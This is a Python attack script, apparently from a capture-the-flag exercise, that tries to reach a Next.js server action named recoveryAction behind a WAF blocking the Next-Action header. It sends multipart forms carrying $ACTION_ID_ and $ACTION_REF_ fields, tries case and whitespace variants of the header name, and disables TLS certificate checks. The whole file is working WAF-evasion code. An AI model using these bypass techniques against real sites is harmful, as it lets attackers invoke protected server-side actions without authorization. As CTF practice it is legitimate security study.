#!/usr/bin/env python3
"""Probe Next.js Server Action endpoints despite the Next-Action header WAF.

The page exposes a server action with id 40c6382106bb726484f31b3ebc21b7476819a1cccf
(recoveryAction). The WAF blocks the literal `Next-Action` header. We try the
no-JS form-action fallback path: POST a multipart form with a synthetic field
named $ACTION_ID_<id> (or $ACTION_REF_<id>).
"""

import urllib.request
import urllib.error
import ssl
import json
import sys

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def request(method, url, headers=None, body=None):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X" + "ABCDEF1234"
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        )
        if isinstance(value, str):
            value = value.encode()
        parts.append(value)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


def try_request(label, headers, body):
    status, hdrs, data = request("POST", URL, headers=headers, body=body)
    print(f"\n=== {label}: status={status} ===")
    for k in ("content-type", "x-action-error", "x-nextjs-page", "location"):
        if k in {h.lower() for h in hdrs}:
            for hk, hv in hdrs.items():
                if hk.lower() == k:
                    print(f"{hk}: {hv}")
    body_preview = data[:600]
    try:
        print(body_preview.decode("utf-8", "replace"))
    except Exception:
        print(repr(body_preview))


# Attempt 1: multipart form with $ACTION_ID_<id>
boundary, body = multipart({f"$ACTION_ID_{ACTION_ID}": ""})
try_request(
    "multipart $ACTION_ID",
    {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "text/x-component",
    },
    body,
)

# Attempt 2: same, with $ACTION_REF
boundary, body = multipart({f"$ACTION_REF_{ACTION_ID}": ""})
try_request(
    "multipart $ACTION_REF",
    {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "text/x-component",
    },
    body,
)

# Attempt 3: variations of header case (some WAFs are anchored ^Next-Action$ exactly)
for hname in ("next-action", "Next-action", "NEXT-ACTION", "Next-Action ", " Next-Action"):
    try_request(
        f"hdr <{hname!r}>",
        {hname: ACTION_ID, "Content-Type": "text/plain;charset=UTF-8", "Accept": "text/x-component"},
        b"[]",
    )
